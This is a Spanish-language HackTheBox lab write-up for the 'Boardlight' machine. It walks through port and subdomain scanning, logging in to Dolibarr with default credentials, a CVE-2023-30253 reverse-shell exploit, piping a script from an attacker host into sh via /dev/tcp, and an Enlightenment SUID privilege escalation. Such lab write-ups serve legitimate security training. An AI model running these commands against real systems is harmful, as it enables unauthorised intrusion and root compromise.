---
title: Boardlight
layout: default
parent: HackTheBox
---

# Boardlight
{:.no_toc}

---

1. List
{:toc}

---

## Reconocimiento

Primero comprobaremos que la máquina esta activa con nmap que solo envíe un ping:

```bash
nmap -sn 10.10.11.11
```

Comprobamos que podemos hacerle ping, por lo que ahora pasaremos a hacer un reconocimiento más intensivo, para saber que puertos tiene abiertos. Hacemos un escaneo de todos los puertos TCP abiertos sin descubrimiento de hosts ni resolución DNS exportando a un archivo grepeable.

```bash
nmap -p- -sS --open --min-rate 5000 10.10.11.11 -n -Pn -oG allPorts
```

Se nos muestra que hay dos puertos abiertos, el 22 y el 80. Con la utilidad **extractPorts** podemos extraer los puertos y poder pegarlos de forma más fácil.

Ahora veremos la versión de estos con un escaneo de versión de servicios a un archivo de nmap

```bash
nmap -sCV -p22,80 10.10.11.11 -oN targeted
```

```
nmap -sCV -p22,80 10.10.11.11 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-17 06:39 EDT
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Nmap scan report for 10.10.11.11 (10.10.11.11)
Host is up (0.027s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.00 seconds
```

Podemos ver que es una máquina Ubuntu con un servicio web Apache 2.4.41

Al abrirla en el navegador nos encontramos con un home con un menú lateral derecho, con varios apartados como *About* y una página de contacto. Lo más interesante es al final de la página un pequeño formulario para enviar una petición de llamada. Al introducir la información no tenemos respuesta, por lo que deberemos interceptar que tipo de respuesta se envía al servidor con burp suite.

Interceptamos que es una petición con xml, pero no podemos hacer más por esta parte.

![](/assets/images/Imagenes/Pasted image 20240912230937.png)


Después de esto, podemos probar a realizar un escaneo de subdominios para averiguar si hay más portales con alguna posibilidad de explotación. Para ello primero deberemos añadir a la lista de hosts la resolución de ip de la máquina, en este caso la 10.10.11.11 con dirección **board.htb**.

![](/assets/images/Imagenes/Pasted image 20240912232117.png)

Después con la herramienta **ffuf** buscaremos subdominios que pueda tener el servidor. Con el siguiente comando buscamos con el diccionario de el repositorio de SecLists cualquier coincidencia con el millón de subdominios más usados, comparando el parámetro que le indiquemos, en este caso un subdominio de board.htb, y obviando en este caso, ya que salen demasiadas coincidencias, los resultados con un tamaño de 15949.

```shell
ffuf -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://board.htb -H "Host: FUZZ.board.htb" -fs 15949
```

Es más recomendable filtrar por el tamaño, de palabras o de líneas que por el estado de la página.

Tras realizarlo y filtrar tenemos como coincidencia el subdominio **crm**.

![](/assets/images/Imagenes/Pasted image 20240912233227.png)

Después, al igual que hemos hecho con el dominio, para resolver la dirección deberemos añadir al archivo **/etc/hosts** la dirección y resolución DNS.

![](/assets/images/Imagenes/Pasted image 20240912233405.png)

Al acceder al subdominio nos aparece una página de login de un gestor de contenido llamado Dolibarr.

![](/assets/images/Imagenes/Pasted image 20240912233548.png)

Podemos buscar las credenciales por defecto antes de intentar cualquier método de fuerza bruta. En este caso para Dolibarr en su versión 17 es **admin/admin**.

![](/assets/images/Imagenes/Pasted image 20240912233822.png)

Con ello conseguimos iniciar sesión en el gestor, pero no tenemos permisos de administrador. Podríamos probar a intentar cambiar el id de usuario en detalles de este.

![](/assets/images/Imagenes/Pasted image 20240912234956.png)

Sin embargo está protegido ante estos ataques:

![](/assets/images/Imagenes/Pasted image 20240912235031.png)

Por último podemos buscar por vulnerabilidades de la versión de la aplicación web, como hemos visto Dolibarr 17, y ver si es posible explotarla. Al buscar vemos que existe la CVE-2023-30253.

## Explotación

![](/assets/images/Imagenes/Pasted image 20240912235301.png)

En este caso es poder generar una reverse shell a través de inyección PHP.

![](/assets/images/Imagenes/Pasted image 20240912235515.png)

Podemos ver los parámetros que tiene para realizar el ataque. Para ejecutarlo, primero deberemos estar en escucha por un puerto para captar la reverse shell, en este caso usando netcat.

```shell
nc -lvnp 443
```

Después ejecutaremos el código para conseguir la reverse shell:

```shell
python3 exploit.py http://crm.board.htb admin admin 10.10.14.169 443
```

Con esto ejecutamos el exploit hacia el dominio seleccionado con el usuario y contraseña creados **admin/admin** y que se realice por el puerto 443 hacia nuestra IP. Con esto conseguiremos la reverse shell captada con netcat.

![](/assets/images/Imagenes/Pasted image 20240913000153.png)

Ya dentro de la máquina podemos buscar formas de ganar privilegios, ya que somos el usuario www-data. Buscando entre archivos, el archivo /www/html/crm.board.htb/htdocs/conf/conf.php contiene datos de inicio de sesión de un usuario:

![](/assets/images/Imagenes/Pasted image 20240913000803.png)

Comprobamos que funciona:


![](/assets/images/Imagenes/Pasted image 20240913001102.png)

## Escalada de privilegios

Dentro del directorio del usuario larissa está la flag de usuario. Después para escalar privilegios usaremos la utilidad **LinPeas** (Linux Privilege Scalation). Para ello debemos descargar el script y después que la máquina víctima lo ejecute de nuestro dispositivo.

Primero con netcat montaremos un servidor con el archivo:

```shell
sudo nc -q 5 -lvnp 80 < linpeas.sh
```

Después pediremos desde la máquina víctima a la que tenemos acceso a ejecutar ese script.

```shell
cat < /dev/tcp/10.10.10.10/80 | sh
```

![](/assets/images/Imagenes/Pasted image 20240913004817.png)


Tras correr el script vemos que hay varios archivos que usarse para escalar privilegios

```python
                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                 
                      ╚════════════════════════════════════╝                                                       
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                   
-rwsr-xr-x 1 root root 15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device                                          
-rwsr-sr-x 1 root root 15K Apr  8 18:36 /usr/lib/xorg/Xorg.wrap
-rwsr-xr-x 1 root root 27K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys (Unknown SUID binary!)                                                                                                        
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd (Unknown SUID binary!)                                                                                                   
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight (Unknown SUID binary!)                                                                                                  
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset (Unknown SUID binary!)                                                                                
-rwsr-xr-- 1 root messagebus 51K Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 467K Jan  2  2024 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root dip 386K Jul 23  2020 /usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-x 1 root root 44K Feb  6  2024 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 55K Apr  9 08:34 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                                                                           
-rwsr-xr-x 1 root root 163K Apr  4  2023 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 67K Apr  9 08:34 /usr/bin/su
-rwsr-xr-x 1 root root 84K Feb  6  2024 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 39K Apr  9 08:34 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 87K Feb  6  2024 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 67K Feb  6  2024 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                                
-rwsr-xr-x 1 root root 39K Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 52K Feb  6  2024 /usr/bin/chsh
-rwsr-xr-x 1 root root 15K Oct 27  2023 /usr/bin/vmware-user-suid-wrapper

```


Podemos ver que puede que haya una vulnerabilidad con la utilidad enligtenment de linux.

[Vulnerabilidad Enlightenment v.0.25.3 - Escalada de privilegios](https://www.exploit-db.com/exploits/51180)

https://github.com/nu11secur1ty/CVE-mitre/tree/main/CVE-2022-37706

Descargamos el script, e igual que anteriormente montamos un servidor con python para desde la máquina víctima recoger el script y ejecutarlo.

Host atacante

```shell
python3 -m http.server 80 
```


Máquina víctima

```shell
wget 10.10.14.169/exploit.sh
```

Después le damos permiso con **chmod +x exploit.sh** y lo ejecutaremos, ganando acceso root:

![](/assets/images/Imagenes/Pasted image 20240913010252.png)